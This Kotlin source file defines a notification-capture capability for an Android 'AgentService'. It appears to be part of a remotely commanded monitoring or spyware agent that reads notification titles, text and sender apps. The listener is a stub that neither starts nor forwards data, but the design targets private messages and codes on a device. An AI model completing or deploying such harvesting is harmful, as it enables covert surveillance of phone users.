package com.system.monitor.capabilities

import android.app.Notification
import android.content.Context
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.util.concurrent.ConcurrentLinkedQueue

class NotificationsCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()
    private val queue = ConcurrentLinkedQueue<Map<String, Any>>()
    private var listener: NotificationListener? = null

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "dump" -> dumpNotifications()
            "start" -> startListener()
            "stop" -> stopListener()
            else -> mapOf("error" to "invalid action")
        }
    }

    override fun cleanup() {
        stopListener()
    }

    private fun dumpNotifications(): Map<String, Any> {
        val notifications = queue.toMutableList()
        queue.clear()
        return mapOf("notifications" to notifications, "count" to notifications.size)
    }

    private fun startListener(): Map<String, Any> {
        // Note: Requires NotificationListenerService permission and enabled in settings
        // This is a stub - real implementation requires a separate service
        return mapOf("status" to "requires_permission")
    }

    private fun stopListener(): Map<String, Any> {
        listener = null
        return mapOf("status" to "stopped")
    }

    // Inner class for the notification listener service
    class NotificationListener : NotificationListenerService() {
        override fun onNotificationPosted(sbn: StatusBarNotification) {
            val notification = sbn.notification
            val extras = notification.extras
            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val pkg = sbn.packageName
            val time = sbn.postTime
            // In a real implementation, this would be sent to the capability
        }
        override fun onNotificationRemoved(sbn: StatusBarNotification) {}
    }

    data class Params(val action: String)
}